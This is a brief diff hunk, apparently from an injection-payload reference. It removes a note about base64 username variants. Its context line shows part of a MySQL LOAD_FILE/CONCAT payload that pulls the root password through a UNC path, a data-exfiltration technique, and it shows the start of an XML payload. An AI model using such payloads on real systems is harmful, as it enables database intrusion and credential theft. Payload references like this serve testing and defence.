@@ -309,8 +309,6 @@ SELECT LOAD_FILE(CONCAT('\\\\', 'SELECT password FROM mysql.users WHERE user=\'r
 
 
 **Basic payload structure**
-Other variants could be:
-* base64 encoding of the username
 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
